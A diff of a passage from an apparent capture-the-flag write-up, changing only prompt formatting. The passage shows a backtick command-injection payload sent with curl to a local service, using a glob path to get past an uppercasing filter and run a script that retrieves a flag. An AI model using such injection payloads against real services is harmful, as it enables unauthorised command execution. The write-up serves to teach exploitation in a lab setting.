@@ -3,15 +3,16 @@ before treating it. It puts all characters in uppercase, and cut spaces,
 so we can't call /tmp/script easily. However, we can use pattern matching like /*/SCRIPT.
 Thus, is we create the said /tmp/SCRIPT, it will match.
 
--> vi /tmp/SCRIPT
+$> vi /tmp/SCRIPT
 
 #!/bin/bash
 
-getflag >/tmp/flag
+getflag > /tmp/flag
 
--> chmod +x /tmp/SCRIPT
--> curl localhost:4646?x='`/*/SCRIPT`'
--> cat /tmp/flag
+$> chmod +x /tmp/SCRIPT
+$> curl localhost:4646?x='`/*/SCRIPT`'
+$> cat /tmp/flag
+
 -> Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 
 We can now get the next flag.
